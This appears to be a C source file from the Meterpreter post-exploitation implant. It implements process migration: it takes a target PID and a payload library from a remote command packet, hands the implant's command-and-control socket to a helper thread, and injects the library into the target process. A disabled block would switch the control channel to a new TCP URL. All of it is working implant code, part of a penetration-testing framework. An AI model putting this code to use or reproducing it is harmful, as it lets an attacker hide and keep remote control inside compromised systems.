#include "common.h"
#include "base_inject.h"
#include "passfd_server.h"

LONG passfd_thread(THREAD *thread) {
	SOCKET *orig_fd = (SOCKET *)(thread->parameter1);
	LPSTR sock_path = (LPSTR)(thread->parameter2);

	if (orig_fd == NULL || sock_path == NULL)
		return ERROR_INVALID_PARAMETER;

	return passfd(*orig_fd, sock_path);
}

DWORD
remote_request_core_migrate(Remote *remote, Packet *packet)
{
	char *sock_path;
	Packet * response = NULL;
	pid_t pid = 0;
	library l;
	DWORD result = 0;
	SOCKET orig_fd = 0;

	dprintf("[MIGRATE] Getting packet data");

	response = packet_create_response(packet);

	// Get the process identifier to inject into
	pid = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);
	// Get the target process architecture to inject into
	l.arch = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ARCH);
	// Get the length of the library buffer
	l.length = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_LEN);
	// Receive the actual migration library buffer
	l.data = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);
	// Get the library entry point
	l.entry_point = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ENTRY_POINT);
	// Get the library base address
	l.base_addr = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_BASE_ADDR);
	// Get the path for the local socket
	sock_path = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_SOCKET_PATH);

	dprintf("[MIGRATE] Migrating to %d, Arch: %d, Library Length: 0x%x, Library Base Address: 0x%x, Library Entry Point: 0x%x, Socket path : %s", 
			pid, 
			l.arch, 
			l.length,
			l.base_addr,	
			l.entry_point, 
			sock_path);

	if (remote->transport->get_socket) {
		orig_fd = remote->transport->get_socket(remote->transport);
	}
	
	dprintf("[MIGRATE] Creating passfd thread to share socket %d", orig_fd);

	THREAD *socket_thread = thread_create((THREADFUNK)passfd_thread, &orig_fd, sock_path, NULL);

	if (!socket_thread) {
		dprintf("[MIGRATE] Failed to create the passfd thread");
		packet_transmit_response(ERROR_INVALID_HANDLE, remote, response);
		return ERROR_INVALID_HANDLE;
	}

	if (!thread_run(socket_thread)) {
		thread_destroy(socket_thread);
		dprintf("[MIGRATE] Failed to run the passfd thread");
		packet_transmit_response(EINVAL, remote, response);
		return EINVAL;
	}

	dprintf("[MIGRATE] Injecting library");
	result = inject_library(pid, &l);
	if (result != 0) {
		thread_join(socket_thread);
		thread_destroy(socket_thread);
		packet_transmit_response(result, remote, response);
		return result;
	}

	thread_join(socket_thread);
	thread_destroy(socket_thread);

	dprintf("[MIGRATE] return success");
	packet_transmit_response(ERROR_SUCCESS, remote, response);	
	return FALSE;
}

extern Transport* transport_create_tcp(wchar_t* url);

#if 0
// TODO: put this back in when the stageless work has been completed for POSIX.
BOOL
remote_request_core_change_transport(Remote* remote, Packet* packet, DWORD* pResult) {
	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
	Packet* response = packet_create_response(packet);
	UINT transportType = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANSPORT_TYPE);
	char* transportUrl = packet_get_tlv_value_string(packet, TLV_TYPE_TRANSPORT_URL);
	size_t urlSize;

	dprintf("[CHANGE TRANS] Type: %u", transportType);
	dprintf("[CHANGE TRANS] Url: %s", transportUrl);

	if (response == NULL || transportUrl == NULL) {
		dprintf("[CHANGE TRANS] Something was NULL");
		goto out;
	}

	if (transportType == METERPRETER_TRANSPORT_SSL) {
		remote->nextTransport = transport_create_tcp(transportUrl);
		result = ERROR_SUCCESS;
	}
	else {
		dprintf("[CHANGE TRANS] Unsupported");
	}

out:
	if (packet) {
		packet_transmit_empty_response(remote, response, result);
	}

	return result == ERROR_SUCCESS ? FALSE : TRUE;
}
#endif
